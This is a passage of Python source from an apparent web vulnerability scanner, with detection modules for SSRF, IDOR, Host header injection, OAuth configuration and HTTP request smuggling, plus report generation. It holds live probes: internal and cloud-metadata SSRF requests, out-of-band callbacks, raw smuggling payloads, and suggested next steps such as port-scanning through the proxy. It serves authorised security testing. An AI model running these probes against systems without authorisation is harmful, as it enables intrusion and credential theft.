        "root:x:0:0", "ami-id", "instance-id", "security-credentials",
        "redis_version", "It works!", "Apache2 Ubuntu Default Page",
    ]

    def _send(self, param: str, value: str) -> Tuple[Resp, str]:
        return self.t.inject(param, value)

    def run(self) -> List[Finding]:
        findings: List[Finding] = []
        targets = [p for p in self.t.params if self.NAME_HINTS.search(p)] or []
        if self.t.args.param:
            # Explicitly named parameters win: the operator knows the endpoint.
            targets = sorted(set(targets + self.t.args.param))
        if not targets:
            self.console.info(
                "ssrf: no URL-like parameter found (names checked: url, uri, path, redirect, "
                "image, api...). Point at one with --param if you know it."
            )
            return findings

        for param in targets:
            self.console.info(f"ssrf: probing parameter {param!r}")
            # Baseline: an unresolvable host. Whatever the app does with that is
            # "no fetch happened", and every probe is measured against it.
            baseline, _ = self._send(param, f"http://vapf-{rand_token(10)}.invalid/")
            if baseline.error:
                self.console.debug("ssrf: baseline failed at transport level; continuing")

            for label, probe_url in self.PROBES:
                resp, url = self._send(param, probe_url)
                if resp.error or not resp.text:
                    continue
                # A reflected payload is not an SSRF. Only content that the
                # payload could not have supplied counts.
                if probe_url in resp.text:
                    self.console.debug(f"ssrf: {label} merely reflected")
                    continue
                marker = next((m for m in self.INTERNAL_MARKERS if m in resp.text), None)
                if marker:
                    self.console.crit(f"ssrf: internal content returned via {label}")
                    findings.append(
                        Finding(
                            module=self.name,
                            title="Server-Side Request Forgery (internal content returned)",
                            severity="HIGH",
                            endpoint=url,
                            parameter=param,
                            payload=probe_url,
                            evidence=f"{label}: response contained {marker!r}; "
                                     f"{resp.snippet(marker)}",
                            detail=(
                                "The application fetched a URL we supplied and returned internal "
                                "content. That turns the server into a proxy into its own network: "
                                "loopback-only admin panels, internal APIs, and cloud metadata "
                                "credentials are all reachable while remaining invisible from outside."
                            ),
                            remediation=(
                                "Do not take URLs from users. If a fetch is required, resolve the "
                                "host, reject private/link-local/metadata ranges after resolution, "
                                "pin the resolved IP for the request (to defeat DNS rebinding), and "
                                "allow-list schemes and ports."
                            ),
                            references=[
                                "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
                            ],
                            next_steps=[
                                "Enumerate internal services: sweep loopback ports for 80/8080/6379/9200.",
                                "If 169.254.169.254 answered, retrieve the instance credentials and "
                                "document the blast radius without using them.",
                                "Try the encoded IP forms against the same parameter to see which ones "
                                "the filter misses.",
                            ],
                            request=request_label(url),
                        )
                    )
                    break
                # Weaker signal: the response changed materially. Report it as a
                # lead only, because redirects and error pages also change bodies.
                if baseline.ok and resp.ok and abs(resp.length - baseline.length) > 200:
                    self.console.warn(f"ssrf: response to {label} differs from baseline")
                    findings.append(
                        Finding(
                            module=self.name,
                            title="Possible SSRF (response differs for internal URL)",
                            severity="MEDIUM",
                            endpoint=url,
                            parameter=param,
                            payload=probe_url,
                            evidence=f"baseline {baseline.status}/{baseline.length}B vs "
                                     f"probe {resp.status}/{resp.length}B",
                            detail=(
                                "An internal URL produced a materially different response from an "
                                "unreachable one, which suggests the server attempted the fetch. "
                                "This is not conclusive: error text, redirects and timing can all "
                                "produce the same difference."
                            ),
                            remediation="Same as confirmed SSRF: allow-list destinations, block "
                                        "private ranges after DNS resolution.",
                            next_steps=[
                                "Re-run with --callback-host pointing at a host the target can reach: "
                                "a callback turns this lead into proof.",
                                "Compare the error strings for an open vs closed internal port; the "
                                "difference is usually enough to port-scan through the proxy.",
                            ],
                            request=request_label(url),
                        )
                    )
                    break

            # --- blind confirmation via callback -------------------------
            oob, can_confirm = oob_base(self.t)
            if oob:
                marker = "ssrf" + rand_token(8)
                cb_url = f"{oob}/{marker}"
                _, url = self._send(param, cb_url)
                self.console.info(f"ssrf: sent callback probe -> {cb_url}")
                hits = poll_callback(self.t, marker, timeout=6.0) if can_confirm else []
                if hits:
                    self.console.crit("ssrf: callback received -- blind SSRF confirmed")
                    findings.append(
                        Finding(
                            module=self.name,
                            title="Blind SSRF confirmed via out-of-band callback",
                            severity="HIGH",
                            endpoint=url,
                            parameter=param,
                            payload=cb_url,
                            evidence=f"target connected back: {hits[0]['method']} {hits[0]['path']} "
                                     f"from {hits[0]['client']}",
                            detail=(
                                "The server fetched a URL we supplied even though the result was not "
                                "returned to us. Blind SSRF still reaches internal services and "
                                "metadata endpoints; the response merely has to be inferred."
                            ),
                            remediation="Allow-list outbound destinations; block private and "
                                        "link-local ranges after DNS resolution.",
                            next_steps=[
                                "Use the callback to port-scan loopback: measure whether the callback "
                                "arrives for http://127.0.0.1:<port>/ targets.",
                            ],
                            request=request_label(url),
                        )
                    )
                elif can_confirm:
                    self.console.info("ssrf: no callback received within 6s")
                else:
                    findings.append(
                        Finding(
                            module=self.name,
                            title="Blind SSRF probe dispatched (manual confirmation required)",
                            severity="INFO",
                            endpoint=url,
                            parameter=param,
                            payload=cb_url,
                            evidence=f"requested {cb_url}; check the external listener",
                            detail="If the listener saw this request, the server fetched a URL we "
                                   "supplied. External listeners cannot be polled from here, so this "
                                   "stays a lead until the hit is observed.",
                            remediation="Allow-list outbound destinations; block private and "
                                        "link-local ranges after DNS resolution.",
                            next_steps=[f"Watch the external listener at {oob} for the request."],
                            request=request_label(url),
                        )
                    )
        return findings


# ---------------------------------------------------------------------------
# 8.12 IDOR
# ---------------------------------------------------------------------------
class IDORModule(Module):
    """
    Broken object-level authorisation.

    IDOR cannot be proven by a scanner in the abstract: "id=2 returned data" is
    only a vulnerability if id=2 belongs to somebody else. So this module does
    two separate things:

      * Always: classify the identifiers in the request (sequential? reversible
        base64? UUID?) and report which ones are enumerable. That is genuinely
        useful and needs no privileges.
      * Only with --idor-a/--idor-b: fetch two URLs/objects that you know belong
        to two different accounts, using the current session. If both come back
        with data, authorisation is missing; if the second is denied, the
        control works and the report says so (negative evidence is worth having).

    It never walks id+1 automatically, because that both floods the target and
    drops other users' data into your report without you choosing to.
    """

    name = "idor"
    description = "Identifier shape analysis + A/B object-access comparison (--idor-a/--idor-b)"

    UUID_RE = re.compile(r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$", re.I)
    HEX_RE = re.compile(r"^[0-9a-f]{16,}$", re.I)
    B64_RE = re.compile(r"^[A-Za-z0-9_-]{4,}={0,2}$")

    def _classify(self, name: str, value: str) -> Optional[str]:
        if not value:
            return None
        if value.isdigit():
            return f"`{name}` is a sequential integer -- enumerable by increment"
        if self.UUID_RE.match(value):
            return f"`{name}` is a UUIDv4 -- not enumerable, look for it leaking elsewhere"
        if self.HEX_RE.match(value):
            return f"`{name}` looks like a hex hash -- check whether it is a plain digest of a small integer"
        if self.B64_RE.match(value):
            padded = value + "=" * (-len(value) % 4)
            try:
                raw = base64.urlsafe_b64decode(padded)
                decoded = raw.decode("utf-8")
            except (binascii.Error, ValueError, UnicodeDecodeError):
                return None
            # Only call it base64 when it round-trips and decodes to visible
            # text. Without both checks, any ordinary word of four letters is
            # reported as an encoded identifier.
            if not decoded:
                return None
            if any(ord(ch) < 0x20 or ord(ch) > 0x7E for ch in decoded):
                return None
            if base64.urlsafe_b64encode(raw).decode().rstrip("=") != value.rstrip("="):
                return None
            return f"`{name}` is base64url -- decodes to {decoded!r} (reversible identifier)"
        return None

    def run(self) -> List[Finding]:
        findings: List[Finding] = []
        # Identifiers can live in the query string, a form body or a JSON body.
        query = self.t.all_values()

        # --- 1. identifier analysis --------------------------------------
        notes = []
        for name in self.t.params:
            note = self._classify(name, query.get(name, ""))
            if note:
                notes.append(note)
        if notes:
            self.console.info(f"idor: {len(notes)} identifier(s) worth testing")
            findings.append(
                Finding(
                    module=self.name,
                    title="Enumerable object reference in request",
                    severity="INFO",
                    endpoint=self.t.url,
                    parameter=", ".join(self.t.params),
                    payload="",
                    evidence="; ".join(notes),
                    detail=(
                        "The parameter references an object directly and the identifier is "
                        "predictable or reversible. Whether that is a vulnerability depends "
                        "entirely on whether the backend checks that *this* user may read that "
                        "object -- that check is what --idor-a/--idor-b tests."
                    ),
                    remediation=(
                        "Enforce object-level authorisation on every read/write (compare the "
                        "authenticated subject against the object's owner), and prefer "
                        "non-enumerable identifiers such as UUIDv4 as defence in depth."
                    ),
                    references=[
                        "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html"
                    ],
                    next_steps=[
                        "Create two accounts, capture the same request for each, and swap the "
                        "identifier. Then re-run with --idor-a <yours> --idor-b <theirs>.",
                        "Also try the identifier in a different HTTP method, a .json suffix, "
                        "and a duplicate parameter (parameter pollution).",
                    ],
                    request=f"GET {self.t.url}",
                )
            )

        # --- 2. controlled A/B comparison --------------------------------
        a_url, b_url = self.t.args.idor_a, self.t.args.idor_b
        if not (a_url and b_url):
            self.console.info(
                "idor: identifier analysis only -- pass --idor-a and --idor-b (objects owned "
                "by two different accounts) to test access control"
            )
            return findings

        resp_a = self.t.http.get(a_url)
        resp_b = self.t.http.get(b_url)
        if resp_a.error or resp_b.error:
            self.console.warn("idor: A/B comparison could not complete (transport error)")
            return findings

        denied = resp_b.status in (401, 403, 404)
        if resp_a.ok and resp_b.ok and resp_a.digest != resp_b.digest:
            self.console.crit("idor: object B returned data with account A's session")
            findings.append(
                Finding(
                    module=self.name,
                    title="IDOR: object of another account is accessible",
                    severity="CRITICAL",
                    endpoint=b_url,
                    parameter="",
                    payload="",
                    evidence=f"object A -> {resp_a.status} ({resp_a.length}B); "
                             f"object B -> {resp_b.status} ({resp_b.length}B), different content",
                    detail=(
                        "The session that owns object A also reads object B, so authorisation is "
                        "decided by the identifier rather than by the subject. Any user can "
                        "enumerate or guess their way to other users' records."
                    ),
                    remediation=(
                        "Check ownership server-side on every object access "
                        "(object.owner_id == session.user_id), deny by default, and log the "
                        "denials so enumeration is visible."
                    ),
                    next_steps=[
                        "Determine the identifier space (sequential? how many objects?) to size "
                        "the exposure.",
                        "Test whether write operations (PUT/PATCH/DELETE) have the same gap.",
                    ],
                    request=f"GET {b_url} (session from account A)",
                )
            )
        elif denied:
            self.console.good(f"idor: object B denied ({resp_b.status}) -- access control works")
            findings.append(
                Finding(
                    module=self.name,
                    title="Object-level access control enforced (negative result)",
                    severity="INFO",
                    endpoint=b_url,
                    evidence=f"object A -> {resp_a.status}; object B -> {resp_b.status} (denied)",
                    detail=(
                        "Cross-account object access was refused, which is the correct behaviour. "
                        "Recorded so the report shows the check was actually run."
                    ),
                    remediation="No action; keep the ownership check on every object route.",
                    request=f"GET {b_url}",
                )
            )
        else:
            self.console.info("idor: A/B comparison inconclusive (identical or empty responses)")
        return findings


# ---------------------------------------------------------------------------
# 8.13 HOST HEADER INJECTION
# ---------------------------------------------------------------------------
class HostHeaderModule(Module):
    """
    HTTP Host header attacks.

    Two separate questions, both answered from the response:

      * Is the Host header reflected anywhere (body or Location)? That is the
        password-reset-poisoning primitive: the reset link is built from a value
        the attacker controls.
      * Does the front end accept a Host it should not? If an unknown hostname
        still gets the normal 200 page, the routing layer is trusting input and
        the same trick reaches cached pages and internal vhosts.

    X-Forwarded-Host is tested alongside Host because many stacks trust the
    former without validating it, and reverse proxies often rewrite only one.
    """

    name = "hostheader"
    description = "Host / X-Forwarded-Host reflection and unknown-host acceptance"

    def _with_host(self, value: str, header_name: str = "Host") -> Resp:
        return self.t.http.get(self.t.url, headers={header_name: value, "Connection": "close"})

    def run(self) -> List[Finding]:
        findings: List[Finding] = []
        marker_host = f"vapf{rand_token(8)}.invalid"
        baseline = self.t.baseline

        for header_name in ("Host", "X-Forwarded-Host"):
            resp = self._with_host(marker_host, header_name)
            if resp.error:
                self.console.debug(f"hostheader: {header_name} probe failed: {resp.error}")
                continue

            reflected_in_body = marker_host in resp.text
            location = resp.headers.get("Location", "") or resp.headers.get("location", "")
            reflected_in_location = marker_host in location

            if reflected_in_body or reflected_in_location:
                where = "Location header" if reflected_in_location else "response body"
                self.console.warn(f"hostheader: {header_name} reflected into the {where}")
                findings.append(
                    Finding(
                        module=self.name,
                        title=f"{header_name} header reflected into {where}",
                        severity="MEDIUM",
                        endpoint=self.t.url,
                        parameter=header_name,
                        payload=f"{header_name}: {marker_host}",
                        evidence=(location[:200] if reflected_in_location
                                  else resp.snippet(marker_host)),
                        detail=(
                            f"A value we control appears in a URL the application generated. Any "
                            f"feature that emails links (password reset, invitations, receipt "
                            f"links) builds them from this value, so an attacker can point the "
                            f"victim's token at their own host."
                        ),
                        remediation=(
                            "Never build absolute URLs from the request. Configure a canonical "
                            "base URL server-side, validate the Host against an allow-list, and "
                            "ignore X-Forwarded-Host unless a trusted proxy sets it."
                        ),
                        references=[
                            "https://portswigger.net/web-security/host-header"
                        ],
                        next_steps=[
                            "Trigger a password reset for an account you own while the header is "
                            "poisoned, and confirm the link points at the marker host.",
                            "Test whether the poisoned response is cacheable -- that escalates this "
                            "to web cache poisoning.",
                        ],
                        request=f"GET {self.t.url} with {header_name}: {marker_host}",
                    )
                )
                continue

            # Accepted-but-not-reflected: routing trusts an arbitrary hostname.
            if baseline and resp.ok and abs(resp.length - baseline.length) < 50:
                self.console.info(f"hostheader: arbitrary {header_name} accepted ({resp.status})")
                findings.append(
                    Finding(
                        module=self.name,
                        title=f"Arbitrary {header_name} accepted by the front end",
                        severity="LOW",
                        endpoint=self.t.url,
                        parameter=header_name,
                        payload=f"{header_name}: {marker_host}",
                        evidence=f"marker host -> {resp.status} ({resp.length}B), "
                                 f"baseline -> {baseline.status} ({baseline.length}B)",
                        detail=(
                            "The application served its normal page for a hostname it does not "
                            "own. Reflection may still happen in a feature not exercised here "
                            "(reset emails, canonical links), and a permissive router widens "
                            "routing-based SSRF and cache poisoning options."
                        ),
                        remediation=(
                            "Reject requests whose Host is not on the configured allow-list, and "
                            "make that the default vhost behaviour."
                        ),
                        next_steps=[
                            "Check password reset and invitation emails for absolute links.",
                            "Test whether the same arbitrary host can reach an internal vhost.",
                        ],
                        request=f"GET {self.t.url} with {header_name}: {marker_host}",
                    )
                )
        return findings


# ---------------------------------------------------------------------------
# 8.14 OAUTH / OIDC
# ---------------------------------------------------------------------------
class OAuthModule(Module):
    """
    OAuth 2.0 / OpenID Connect configuration review.

    Read-only: it fetches the discovery documents and inspects authorisation
    links already present in the page. It does not register a client, does not
    start a flow, and does not touch redirect_uri validation -- those need a
    human deciding what is in scope, because they create state on the provider.

    What it can tell you without any of that is still worth having: whether the
    implicit flow is offered, whether dynamic registration is exposed, whether
    request_uri is supported (an SSRF vector), and whether authorisation links
    carry a state parameter at all.
    """

    name = "oauth"
    description = "OAuth/OIDC discovery, implicit-flow and missing-state checks (read-only)"

    DISCOVERY = [
        "/.well-known/openid-configuration",
        "/.well-known/oauth-authorization-server",
        "/.well-known/jwks.json",
    ]

    def run(self) -> List[Finding]:
        findings: List[Finding] = []
        base = self.t.url.rstrip("/")

        config = None
        config_url = ""
        for path in self.DISCOVERY:
            url = base + path
            resp = self.t.http.get(url)
            if not resp.ok or not resp.text.strip().startswith("{"):
                continue
            try:
                data = json.loads(resp.text)
            except json.JSONDecodeError:
                continue
            if isinstance(data, dict) and ("issuer" in data or "authorization_endpoint" in data):
                config, config_url = data, url
                self.console.good(f"oauth: discovery document at {url}")
                break

        if config:
            endpoints = [k for k in config if k.endswith("_endpoint")]
            response_types = config.get("response_types_supported") or []
            notes = [f"issuer: {config.get('issuer', '?')}"]
            notes.append(f"endpoints: {', '.join(endpoints) or 'none advertised'}")
            if "token" in response_types:
                notes.append("implicit flow available (response_type=token)")
            if config.get("registration_endpoint"):
                notes.append("dynamic client registration advertised")
            if config.get("request_uri_parameter_supported"):
                notes.append("request_uri supported (server-side fetch of a JWT)")

            risky = (
                config.get("registration_endpoint")
                or config.get("request_uri_parameter_supported")
                or "token" in response_types
            )
            if risky:
                findings.append(
                    Finding(
                        module=self.name,
                        title="OAuth/OIDC surface with weak-flow options",
                        severity="LOW",
                        endpoint=config_url,
                        payload="",
                        evidence="\n".join(notes),
                        detail=(
                            "The provider advertises options that widen the attack surface: the "
                            "implicit flow puts tokens in a URL fragment, dynamic registration lets "
                            "a client be created without an operator, and request_uri makes the "
                            "server fetch a URL. Each needs manual testing -- this is configuration "
                            "review, not a finding of exploitability."
                        ),
                        remediation=(
                            "Prefer authorization code + PKCE; disable implicit and dynamic "
                            "registration in production; if request_uri is supported, allow-list "
                            "the schemes, hosts and request objects it accepts."
                        ),
                        references=["https://portswigger.net/web-security/oauth"],
                        next_steps=[
                            "Test redirect_uri validation by hand (path prefix, @-trick, duplicate "
                            "parameters, localhost).",
                            "If dynamic registration is open, register a client with your own "
                            "redirect_uri and observe where the provider fetches from.",
                            "Check whether scope is validated at the token endpoint (scope upgrade).",
                        ],
                        request=f"GET {config_url}",
                    )
                )

        # --- authorisation links on the page ----------------------------
        page = self.t.baseline
        if page and page.text:
            links = re.findall(r"[^\"'\s<>]*(?:authorize|authorization|oauth)[^\"'\s<>]*", page.text, re.I)
            auth_links = [l for l in links if "response_type=" in l]
            for link in auth_links[:5]:
                has_state = "state=" in link
                self.console.info(f"oauth: authorisation link found (state={'yes' if has_state else 'no'})")
                if not has_state:
                    findings.append(
                        Finding(
                            module=self.name,
                            title="OAuth authorisation request without state parameter",
                            severity="MEDIUM",
                            endpoint=urljoin(base + "/", link),
                            payload="",
                            evidence=link[:300],
                            detail=(
                                "Without state, the callback cannot tell whether this authorisation "
                                "response belongs to the browser that started the flow, so an "
                                "attacker can complete a flow with their own account and have the "
                                "victim's session link to it (login CSRF / account binding)."
                            ),
                            remediation=(
                                "Generate an unguessable state value per authorisation request, bind "
                                "it to the session, and reject callbacks whose state does not match."
                            ),
                            next_steps=[
                                "Attempt the linking flow with an attacker-controlled account and see "
                                "whether the victim's session picks it up.",
                            ],
                            request=f"GET {urljoin(base + '/', link)}",
                        )
                    )
                break  # one representative link is enough
        return findings


# ---------------------------------------------------------------------------
# 8.15 HTTP REQUEST SMUGGLING
# ---------------------------------------------------------------------------
class SmugglingModule(Module):
    """
    CL.TE / TE.CL detection by timing, over a dedicated raw socket.

    How the probe works: the request declares Transfer-Encoding: chunked and a
    Content-Length that ends one byte early. A front end that trusts
    Content-Length forwards the body; a back end that trusts chunked encoding
    finishes the chunk and then waits for the next one, which never arrives, so
    the response stalls.

    What makes this defensible is the control: a plain POST to the same path
    first. If that is already slow, the module reports nothing, because "slow"
    must not be mistaken for "desynchronised". A stall only counts when the
    control came back promptly.

    Severity is capped at MEDIUM and the wording says suspected: confirming
    smuggling needs a second request on the same connection (Burp, ``Send group
    in sequence``), which cannot be done safely behind an unknown front end.
    """

    name = "smuggling"
    description = "CL.TE / TE.CL timing probes over a raw socket (suspected-only)"

    def _raw(self, payload: bytes, timeout: float = 8.0) -> Tuple[float, bytes]:
        """Send raw bytes on a fresh connection and return (elapsed, response)."""
        parts = urlparse(self.t.url)
        host = parts.hostname or ""
        port = parts.port or (443 if parts.scheme == "https" else 80)
        sock = socket.create_connection((host, port), timeout=5)
        try:
            if parts.scheme == "https":
                import ssl

                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.sendall(payload)
            sock.settimeout(timeout)
            started = time.time()
            data = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if b"\r\n\r\n" in data:
                        break
            except (socket.timeout, TimeoutError):
                pass
            return time.time() - started, data
        finally:
            try:
                sock.close()
            except OSError:
                pass

    def run(self) -> List[Finding]:
        findings: List[Finding] = []
        parts = urlparse(self.t.url)
        host_header = parts.netloc or parts.hostname or ""
        path = (parts.path or "/") + (("?" + parts.query) if parts.query else "")
        timeout = 8.0

        def build(extra_headers: str, body: str) -> bytes:
            return (
                f"POST {path} HTTP/1.1\r\nHost: {host_header}\r\n{extra_headers}"
                f"Connection: close\r\n\r\n{body}"
            ).encode()

        # --- control: is this endpoint responsive at all? -----------------
        control = build("Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 3\r\n", "a=1")
        control_elapsed, control_data = self._raw(control, timeout)
        if control_elapsed >= timeout - 1.0 or not control_data:
            self.console.warn(
                f"smuggling: control request stalled ({control_elapsed:.1f}s) -- "
                "endpoint is not reliably responsive, skipping to avoid a false positive"
            )
            return findings
        self.console.info(f"smuggling: control responded in {control_elapsed:.2f}s")

        probes = {
            "CL.TE": build(
                "Content-Length: 4\r\nTransfer-Encoding: chunked\r\n",
                "1\r\nA\r\nX",
            ),
            "TE.CL": build(
                "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n",
                "0\r\n\r\nX",
            ),
        }

        for technique, payload in probes.items():
            self.console.info(f"smuggling: sending {technique} timing probe")
            elapsed, data = self._raw(payload, timeout)
            stalled = elapsed >= timeout - 1.0
            self.console.debug(f"smuggling: {technique} -> {elapsed:.2f}s, {len(data)}B")
            if not stalled:
                continue
            self.console.warn(f"smuggling: {technique} probe stalled while the control did not")
            findings.append(
                Finding(
                    module=self.name,
                    title=f"HTTP request smuggling suspected ({technique})",
                    severity="MEDIUM",
                    endpoint=self.t.url,
                    parameter="(request framing)",
                    payload=f"Content-Length / Transfer-Encoding mismatch ({technique})",
                    evidence=f"control responded in {control_elapsed:.2f}s; {technique} probe "
                             f"stalled for {elapsed:.2f}s (timeout {timeout:.0f}s)",
                    detail=(
                        "The front end and the back end disagree about where the request body "
                        "ends. A stalled probe is consistent with the back end waiting for the "
                        "rest of a chunked body that the front end already finished forwarding, "
                        "which is the precondition for smuggling a second request past the front "
                        "end's filters. This is a timing signal, not proof."
                    ),
                    remediation=(
                        "Normalise request framing at the edge: reject requests that send both "
                        "Content-Length and Transfer-Encoding, reject obfuscated TE headers, and "
                        "use a front end that speaks HTTP/2 end-to-end or normalises to HTTP/1 "
                        "before forwarding."
                    ),
                    references=["https://portswigger.net/web-security/request-smuggling"],
                    next_steps=[
                        "Confirm by hand in Burp Repeater: send the probe, then a normal request on "
                        "the same connection (Send group in sequence, single connection). A 404 or "
                        "the smuggled response proves the desync.",
                        "Test the TE.TE variant: obfuscate the header (Transfer-Encoding : chunked, "
                        "xchunked, tab before the value) until one hop ignores it.",
                        "Do not run confirmation against a shared or production front end: a "
                        "successful desync affects other users' requests.",
                    ],
                    request=f"POST {self.t.url} with {technique} framing",
                )
            )

        return findings


# ===========================================================================
# 9. REPORTING
# ===========================================================================
class Reporter:
    """
    Markdown for humans, JSON for tooling. Both are generated from the same
    Finding objects, so they can never disagree.
    """

    MD_TEMPLATE_HEADER = """# Vulnerability Assessment Report

- **Target:** `{target}`
- **Generated:** {when}
- **Framework:** {tool} v{version}
- **Session:** {session}
- **Requests issued:** {requests}

**Scope note:** Assessed with detection-only probes. No data was extracted, no
credentials were guessed, and no files were written to the target.

---

## 1. Executive summary

| Severity | Count |
|----------|-------|
{severity_rows}

{headline}

## 2. Target fingerprint

| Property | Value |
|----------|-------|
{fingerprint_rows}

## 3. Findings
"""

    def __init__(self, console: Console, target: str, tech: TechFingerprint,
                 tools: ToolOrchestrator, requests_made: int, args: argparse.Namespace,
                 session_note: str = "unauthenticated",
                 callback: Optional[CallbackServer] = None):
        self.console = console
        self.target = target
        self.tech = tech
        self.tools = tools
        self.requests_made = requests_made
        self.args = args
        # Names only -- the report is a deliverable that gets emailed around, so
        # cookie values and API tokens must never end up inside it.
        self.session_note = session_note
        self.callback = callback

    def build_markdown(self, findings: List[Finding]) -> str:
        counts = {s: sum(1 for f in findings if f.severity == s) for s in SEVERITY_RANK}
        severity_rows = "\n".join(
            f"| {s} | {counts[s]} |" for s in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO")
        )
        total_real = sum(counts[s] for s in ("CRITICAL", "HIGH", "MEDIUM", "LOW"))
        if counts["CRITICAL"]:
            headline = (f"**{counts['CRITICAL']} critical finding(s).** The target is exploitable "
                        "without authentication in at least one place; remediation should start "
                        "there.")
        elif counts["HIGH"]:
            headline = (f"**{counts['HIGH']} high-severity finding(s).** Confirmed exploitable "
                        "issues were identified; treat the affected endpoints as compromised "
                        "surface until patched.")
        elif total_real:
            headline = "No critical or high-severity issues were confirmed. Lower-severity findings below."
        else:
            headline = ("No vulnerabilities were confirmed by the automated probes. This is not "
                        "proof of security: business-logic flaws, authenticated-only endpoints and "
                        "chained attacks are outside the scope of this scan.")

        fingerprint_rows = "\n".join(
            f"| {k.replace('_', ' ').title()} | {v} |" for k, v in self.tech.as_dict().items()
        )

        out = self.MD_TEMPLATE_HEADER.format(
            target=self.target,
            when=datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC"),
            tool=TOOL, version=VERSION,
            requests=self.requests_made,
            session=self.session_note,
            severity_rows=severity_rows,
            headline=headline,
            fingerprint_rows=fingerprint_rows,
        )

        if not findings:
            out += "\n_No findings recorded._\n"
        for idx, f in enumerate(findings, 1):
            out += f"\n### {idx}. [{f.severity}] {f.title}\n\n"
            out += f"- **Module:** `{f.module}`\n"
            out += f"- **Endpoint:** `{f.endpoint}`\n"
            if f.parameter:
                out += f"- **Parameter:** `{f.parameter}`\n"
            if f.payload:
                out += f"- **Payload:** `{f.payload}`\n"
            if f.request:
                out += f"- **Request:** `{f.request}`\n"
            if f.evidence:
                out += "\n**Evidence**\n\n```\n" + f.evidence.strip()[:1500] + "\n```\n"
            if f.detail:
                out += f"\n**Why it matters**\n\n{f.detail}\n"
            if f.remediation:
                out += f"\n**Remediation**\n\n{f.remediation}\n"
            if f.next_steps:
                out += "\n**Suggested next steps (manual)**\n\n"
                for step in f.next_steps:
                    out += f"- {step}\n"
            if f.references:
                out += "\n**References**\n\n"
                for ref in f.references:
                    out += f"- {ref}\n"

        # Appendices give the reviewer the context to trust the findings.
        out += "\n---\n\n## 4. Tool inventory\n\n| Tool | Path |\n|------|------|\n"
        for name, path in self.tools.inventory().items():
            out += f"| {name} | `{path}` |\n"

        authed = self.session_note != "unauthenticated"
        session_para = (
            "Findings therefore reflect what an authenticated user can reach; server-side "
            "authorisation was not separately tested.\n\n" if authed
            else "Findings reflect unauthenticated reach only.\n\n"
        )
        not_covered = (
            "Not covered by this scan: business-logic abuse, deserialisation, race conditions, "
            "and client-side issues beyond reflected input.\n" if authed else
            "Not covered by this scan: authenticated functionality, business-logic abuse, "
            "deserialisation, race conditions, and client-side issues beyond reflected input.\n"
        )
        out += (
            "\n## 5. Scope and method\n\n"
            "All probes were differential: every payload was compared against a baseline "
            "response fetched before injection, and each finding required a second, "
            "independent confirmation (differential arithmetic for SSTI, a doubled delay for "
            "time-based injection, a second traversal for LFI). Requests were rate-limited to "
            f"{self.args.delay}s apart.\n\n"
            f"Session: {self.session_note}. " + session_para + not_covered
        )

        # Callback evidence is the only proof some findings can ever have, so it
        # belongs in the report even though the module already quoted the hit.
        callback_hits = self.callback.all_hits() if self.callback else []
        if callback_hits:
            out += ("\n## 6. Out-of-band callbacks received\n\n"
                    "Requests the target made to the assessment listener. Each row is proof "
                    "that a supplied URL was fetched server-side.\n\n"
                    "| Time (UTC) | Method | Path | Source |\n|------------|--------|------|--------|\n")
            for hit in callback_hits[:50]:
                out += (f"| {hit['time'][11:19]} | {hit['method']} | `{hit['path'][:80]}` | "
                        f"{hit['client']} |\n")
        return out

    def build_json(self, findings: List[Finding]) -> str:
        payload = {
            "meta": {
                "tool": TOOL,
                "version": VERSION,
                "target": self.target,
                "generated": datetime.now(timezone.utc).isoformat(),
                "requests": self.requests_made,
                "modules": self.args.modules,
                "session": self.session_note,
                "authenticated": self.session_note != "unauthenticated",
                "scope_note": "detection-only assessment; no extraction performed",
            },
            "fingerprint": self.tech.as_dict(),
            "tools": self.tools.inventory(),
            "summary": {s: sum(1 for f in findings if f.severity == s) for s in SEVERITY_RANK},
            "findings": [f.to_dict() for f in findings],
        }
        return json.dumps(payload, indent=2)

    def write(self, findings: List[Finding], md_path: Path, json_path: Path) -> None:
        md_path.parent.mkdir(parents=True, exist_ok=True)
        md_path.write_text(self.build_markdown(findings), encoding="utf-8")
        json_path.write_text(self.build_json(findings), encoding="utf-8")
        self.console.good(f"report written: {md_path}")
        self.console.good(f"json written:   {json_path}")


# ===========================================================================
# 10. ORCHESTRATOR
# ===========================================================================
class Framework:
    """
    Wires everything together: scope -> baseline -> fingerprint -> modules ->
    report. Each module runs inside its own try/except so a parser bug in one
    cannot take the scan down.
    """

    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.loot = Path(args.loot)
        self.loot.mkdir(parents=True, exist_ok=True)
        # One log per run. A shared, appended nightfalllx.log mixed several scans
        # together, which made the transcript useless exactly when it mattered.
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_path = self.loot / f"nightfalllx_{stamp}.log"
        self.console = Console(verbose=not args.quiet, quiet=args.quiet, logfile=self.log_path)
        self.store = FindingStore(self.console)
        # Parse session material once, up front: both the HTTP layer and the
        # external tools consume it, and a bad header should fail immediately
        # rather than halfway through a scan.
        self.headers = parse_header_args(getattr(args, "header", []) or [])
        self.tools = ToolOrchestrator(
            self.console,
            timeout=args.tool_timeout,
            headers=self.headers,
            cookie=args.cookie,
        )
        self.tech = TechFingerprint(self.console)
        self.http = HttpClient(
            self.console,
            timeout=args.timeout,
            delay=args.delay,
            proxy=args.proxy,
            verify=not args.insecure,
            follow=args.follow,
            headers=self.headers,
            cookie=args.cookie,
        )

    # -- setup -----------------------------------------------------------
    def _prepare(self) -> Optional[Target]:
        self.console.banner(f"{TOOL} v{VERSION} -- {self.args.url}")

        if not ScopeGuard(self.console, self.args.allow_public).check(self.args.url):
            return None

        # Start the OOB listener before the first probe: XXE, SSRF and RFI all
        # need a reachable callback, and it must exist before they send anything.
        callback: Optional[CallbackServer] = None
        if self.args.callback_host:
            callback = CallbackServer(self.console, self.args.callback_host, self.args.callback_port)
            if not callback.start():
